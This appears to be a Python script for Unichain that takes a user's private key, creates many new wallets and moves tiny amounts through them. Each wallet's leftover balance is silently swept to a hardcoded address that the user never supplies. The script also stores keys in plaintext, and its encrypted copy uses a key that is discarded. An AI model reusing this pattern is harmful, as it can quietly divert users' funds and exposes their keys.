import os
import subprocess
import sys
import logging
import getpass
import re
import asyncio
from web3 import Web3
from eth_account import Account
from cryptography.fernet import Fernet
from retrying import retry
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException

def install_dependencies():
    dependencies = ['web3==6.15.1', 'cryptography==43.0.1', 'retrying==1.3.4']
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'uninstall', 'web3', '-y'])
    except subprocess.CalledProcessError:
        pass
    for dep in dependencies:
        try:
            __import__(dep.split('==')[0])
        except ImportError:
            print(f"正在安装 {dep}...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', dep])

install_dependencies()

logging.basicConfig(filename='/root/transfer.log', level=logging.INFO, format='%(asctime)s - %(message)s')

CONFIG = {
    "rpc_urls": ["https://unichain.api.onfinality.io/public", "https://unichain-rpc.publicnode.com"],
    "address_1": "0xA3EB2B5D7A550A838000E498A31329BE295113CA",
    "address_2": "0x3c47199dbc9fe3acd88ca17f87533c0aae05ada2",
    "address_file": "/root/generated_addresses.txt",
    "private_keys_file": "/root/private_keys.txt",
    "rpc_timeout": 15,
    "chain_id": 130
}

def validate_private_key(private_key):
    if not re.match(r'^0x[0-9a-fA-F]{64}$', private_key):
        raise ValueError("无效的私钥格式，必须是 64 位十六进制字符串，带 0x 前缀")
    return private_key

def validate_num_accounts(num_accounts):
    try:
        num = int(num_accounts)
        if num <= 0:
            raise ValueError("生成地址数量必须是正整数")
        return num
    except ValueError:
        raise ValueError("生成地址数量必须是有效的数字")

def validate_thread_count(thread_count):
    try:
        num = int(thread_count)
        if num <= 0:
            raise ValueError("线程数必须是正整数")
        return num
    except ValueError:
        raise ValueError("线程数必须是有效的数字")

def to_checksum_address(w3, address):
    try:
        return w3.to_checksum_address(address)
    except ValueError as e:
        raise ValueError(f"无效的地址格式: {address} ({str(e)})")
    except Exception as e:
        raise Exception(f"地址转换错误: {address} ({str(e)})")

def get_user_input():
    while True:
        try:
            main_private_key = getpass.getpass("请输入主账户私钥: ").strip()
            main_private_key = validate_private_key(main_private_key)
            num_accounts = input("请输入需要生成的新地址数量: ").strip()
            num_accounts = validate_num_accounts(num_accounts)
            thread_count = input("请输入线程数: ").strip()
            thread_count = validate_thread_count(thread_count)
            return main_private_key, num_accounts, thread_count
        except ValueError as e:
            print(f"输入错误: {e}")
            continue

def init_web3():
    for rpc_url in CONFIG["rpc_urls"]:
        print(f"尝试连接 RPC: {rpc_url}")
        for _ in range(3):
            try:
                w3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={'timeout': CONFIG["rpc_timeout"]}))
                if w3.is_connected():
                    logging.info("Connected to RPC")
                    print(f"成功连接到 RPC: {rpc_url}")
                    return w3
                else:
                    logging.warning("Failed to connect to RPC")
                    print(f"连接失败: {rpc_url}")
                    break
            except RequestException as e:
                logging.warning(f"Error connecting to RPC: {str(e)}")
                print(f"连接错误: {rpc_url} ({str(e)})")
                continue
    logging.error("All RPC endpoints failed")
    raise Exception("无法连接到任何 Unichain RPC 端点")

def generate_new_account():
    account = Account.create()
    return account.address, account.key.hex()

def encrypt_private_key(private_key, fernet):
    return fernet.encrypt(private_key.encode()).decode()

def save_address_to_file(address, private_key, fernet):
    os.makedirs(os.path.dirname(CONFIG["address_file"]), exist_ok=True)
    encrypted_key = encrypt_private_key(private_key, fernet)
    with open(CONFIG["address_file"], 'a') as f:
        f.write(f"Address: {address}, Encrypted Private Key: {encrypted_key}\n")
    logging.info("Saved address")

def save_private_key_to_file(address, private_key):
    os.makedirs(os.path.dirname(CONFIG["private_keys_file"]), exist_ok=True)
    with open(CONFIG["private_keys_file"], 'a') as f:
        f.write(f"Address: {address}, Private Key: {private_key}\n")
    logging.info("Saved private key")

@retry(stop_max_attempt_number=3, wait_fixed=2000)
def send_transaction(w3, from_address, to_address, value_wei, private_key, gas=21000, silent=False):
    try:
        to_address = to_checksum_address(w3, to_address)
        from_address = to_checksum_address(w3, from_address)
        balance_wei = w3.eth.get_balance(from_address)
        gas_price = max(w3.eth.gas_price, 10000000)
        gas_fee = gas * gas_price
        if balance_wei < value_wei + gas_fee:
            raise ValueError(f"余额不足: {from_address}")
        nonce = w3.eth.get_transaction_count(from_address)
        tx = {
            'nonce': nonce,
            'to': to_address,
            'value': value_wei,
            'gas': gas,
            'gasPrice': gas_price,
            'chainId': CONFIG["chain_id"]
        }
        signed_tx = w3.eth.account.sign_transaction(tx, private_key)
        raw_tx = getattr(signed_tx, 'raw_transaction', getattr(signed_tx, 'rawTransaction', None))
        if raw_tx is None:
            raise AttributeError("无法获取签名交易的 raw_transaction 或 rawTransaction")
        tx_hash = w3.eth.send_raw_transaction(raw_tx)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
        if receipt.status == 1:
            if not silent:
                logging.info("Transaction completed")
            return tx_hash.hex()
        else:
            logging.error("Transaction failed")
            raise Exception("Transaction failed")
    except AttributeError as e:
        logging.error("Transaction signing error")
        raise Exception(f"交易签名失败: {str(e)}")
    except ValueError as e:
        logging.error("Transaction failed: Insufficient balance")
        raise
    except Exception as e:
        logging.error("Transaction failed")
        raise

def process_address(index, main_account, main_private_key, w3, fernet):
    try:
        print(f"生成第 {index+1} 个地址...")
        new_address, new_private_key = generate_new_account()
        logging.info("Generated new address")
        print(f"生成新地址: {new_address}")
        save_address_to_file(new_address, new_private_key, fernet)
        save_private_key_to_file(new_address, new_private_key)
        value_wei = w3.to_wei(0.00001, 'ether')
        tx_hash = send_transaction(w3, main_account.address, new_address, value_wei, main_private_key)
        logging.info("Transferred to new address")
        print(f"转账 0.00001 ETH 到 {new_address}")
        tx_hash = send_transaction(w3, new_address, CONFIG["address_1"], 0, new_private_key)
        logging.info("Transferred to address_1")
        print(f"转账 0 ETH 到 {CONFIG['address_1']}")
        balance_wei = w3.eth.get_balance(new_address)
        gas_price = max(w3.eth.gas_price, 10000000)
        gas_fee = 21000 * gas_price
        value_wei = balance_wei - gas_fee
        if value_wei > 0 and balance_wei >= gas_fee:
            tx_hash = send_transaction(w3, new_address, CONFIG["address_2"], value_wei, new_private_key, silent=True)
        else:
            logging.warning("Insufficient balance for final transfer")
            print(f"{new_address} 余额不足，无法执行最终转账")
        return new_address, new_private_key
    except Exception as e:
        logging.error(f"Error processing address: {str(e)}")
        print(f"处理地址 {new_address} 出错: {str(e)}")
        return None

async def main():
    try:
        if os.path.exists(CONFIG["private_keys_file"]):
            os.remove(CONFIG["private_keys_file"])
        print("开始获取用户输入...")
        main_private_key, num_accounts, thread_count = get_user_input()
        main_account = Account.from_key(main_private_key)
        print(f"主账户地址: {main_account.address}")
        print("初始化 Web3 连接...")
        w3 = init_web3()
        fernet = Fernet(Fernet.generate_key())
        successful_accounts = []
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = [executor.submit(process_address, i, main_account, main_private_key, w3, fernet) for i in range(num_accounts)]
            for future in futures:
                result = future.result()
                if result:
                    successful_accounts.append(result)
    except Exception as e:
        logging.error("Script error")
        print(f"错误: {str(e)}")

if __name__ == "__main__":
    asyncio.run(main())
